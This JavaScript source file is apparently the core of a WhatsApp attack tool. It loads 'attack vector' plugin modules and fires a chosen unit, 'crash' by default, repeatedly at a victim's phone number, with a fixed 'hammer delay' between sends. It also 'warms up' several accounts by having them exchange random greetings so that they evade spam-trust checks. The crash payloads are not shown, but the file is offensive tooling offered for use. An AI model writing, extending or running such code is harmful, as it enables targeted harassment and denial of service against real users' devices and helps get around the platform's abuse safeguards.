/**
 * XOVALIUM KERNEL ENGINE
 * The core orchestrator for modular attack vectors and system maintenance.
 */
import fs from "fs";
import path from "path";
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const kernelsDir = path.join(__dirname, 'kernels');

// --- REGISTRIES ---
export const KERNELS = {};         // Persistent Modular KernELS
export const TEMP_KERNELS = {};    // In-Memory Temporary Kernels (Memory-only)

/**
 * Load and verify modular kernels from disk.
 * Verification requirement: Must export 'version' and 'hash'.
 */
export const reloadKernels = async () => {
    if (!fs.existsSync(kernelsDir)) {
        fs.mkdirSync(kernelsDir, { recursive: true });
        return;
    }
    
    // Clear current registry (except protected ones if any)
    for (const key in KERNELS) delete KERNELS[key];

    const files = fs.readdirSync(kernelsDir).filter(f => f.endsWith('.js'));
    console.log(`[ ENGINE ] Scanning ${files.length} units for verification...`);

    for (const file of files) {
        try {
            const kernelPath = `file://${path.join(kernelsDir, file)}?update=${Date.now()}`;
            const module = await import(kernelPath);
            
            // VERIFICATION CHECK
            if (!module.version || !module.hash) {
                console.warn(`[ ENGINE ] Rejected ${file}: Missing version or hash fingerprint.`);
                continue;
            }

            const fnName = file.replace('.js', '').toLowerCase();
            const exportedFn = module[file.replace('.js', '')] || 
                             module[fnName] || 
                             Object.values(module).find(v => typeof v === 'function');

            if (exportedFn) {
                KERNELS[fnName] = {
                    execute: exportedFn,
                    version: module.version,
                    hash: module.hash,
                    type: 'persistent'
                };
            }
        } catch (err) {
            console.error(`[ ENGINE ] Failed to initialize unit ${file}:`, err.message);
        }
    }
    console.log(`[ ENGINE ] Runtime Registry size: ${Object.keys(KERNELS).length} active units.`);
};

// Initial system calibration
reloadKernels();

/**
 * Register a temporary function into the volatile memory stack.
 */
export const registerTempKernel = (name, fn) => {
    const unitName = name.toLowerCase();
    TEMP_KERNELS[unitName] = {
        execute: fn,
        version: "TEMP-RUNTIME",
        hash: "VOLATILE_STACK_" + Math.random().toString(16).slice(2, 8),
        type: 'temporary'
    };
    return TEMP_KERNELS[unitName].hash;
};

/**
 * Main command dispatcher for Neural Attacks
 */
export const executeAttack = async (sock, jid, type = 'crash', amount = 10) => {
    const unitType = type.toLowerCase();
    console.log(`[ SYSTEM ] Sequence Request: ${unitType} (x${amount}) -> ${jid}`);
    
    // AUTHENTICATION GUARD: Prevent crash if socket is disconnected/unauthenticated
    if (!sock || typeof sock.sendMessage !== 'function' || !sock.authState?.creds?.me) {
        console.warn(`[ ENGINE ] Sequence rejected: Account not authenticated.`);
        return { success: false, error: 'Engine Fault: Account connection unstable or unauthenticated' };
    }

    // Auto-formatting JID
    if (!jid.includes('@')) {
        jid = jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    }

    try {
        const iter = parseInt(amount) || 10;
        
        // Lookup Unit (Priority: TEMP -> PERSISTENT)
        const unit = TEMP_KERNELS[unitType] || KERNELS[unitType] || KERNELS["crash"];
        
        if (!unit) return { success: false, error: 'Sequence mapping failed: Unit not found' };

        console.log(`[ ENGINE ] Dispatching Unit: ${unitType} | Ver: ${unit.version} | Hash: ${unit.hash}`);

        for (let i = 0; i < iter; i++) {
            await unit.execute(sock, jid);
            // Hammer delay
            await new Promise(resolve => setTimeout(resolve, 300));
        }

        return { success: true, target: jid };
    } catch (err) {
        console.error('[ ENGINE ERROR ] Sequence failed:', err);
        return { success: false, error: err.message };
    }
};

/**
 * Human-simulated interaction helper
 */
export const accountWarmingUp = async (socks, logFn) => {
    if (socks.length < 2) return { success: false, error: 'Need more accounts' };
    const phrases = ["Halo", "P", "Apa kabar?", "Dah makan?", "Woke"];
    
    logFn(`[ ENGINE ] Warming Up: Calibrating account trust scores...`);
    for (const sender of socks) {
        const others = socks.filter(s => s.user?.id && s.user.id !== sender.user?.id);
        if (others.length === 0) continue;
        const target = others[Math.floor(Math.random() * others.length)];
        const targetJid = target.user.id.split(':')[0] + '@s.whatsapp.net';
        try {
            const p = phrases[Math.floor(Math.random() * phrases.length)];
            await sender.sendMessage(targetJid, { text: p });
            logFn(`[ WARM-UP ] ${sender.user.id.split(':')[0]} -> ${targetJid}: "${p}"`);
            await new Promise(r => setTimeout(r, 2000));
        } catch (e) {}
    }
    return { success: true };
};
